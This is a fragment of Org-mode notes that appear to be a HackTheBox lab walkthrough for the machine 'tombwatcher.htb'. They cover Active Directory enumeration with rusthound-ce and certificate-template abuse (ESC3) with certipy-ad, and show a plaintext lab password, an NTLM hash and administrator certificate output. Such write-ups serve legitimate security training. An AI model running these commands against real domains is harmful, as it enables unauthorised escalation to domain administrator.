=
tags: #windows #active-directory #ad #adcs #certipy
...
* rusthound-ce
  #+begin_src 
  rusthound-ce -u john -p 'JohnNewP@ss!' -d 'tombwatcher.htb' -c All --zip
  #+end_src
...
[*] Wrote certificate and private key to 'cert_admin.pfx'
   #+end_src
** back to the original certipy output for all certificates
   the command from [[*certipy][this section]]
   #+begin_src bat
   certipy-ad find -u john -hashes :08c7fbb0121095c2ba13f4297b7ca355 -target 10.10.11.72
   #+end_src
   results in output which includes other certificates as well, one of which is a template
   named =User= which is vulnerable to ESC3; it also has =Client Authenticating= as an EKU
   #+begin_src 
...
[*] Wrote certificate and private key to 'administrator.pfx'
   #+end_src
** now let's use the administrator cert
   #+begin_src 
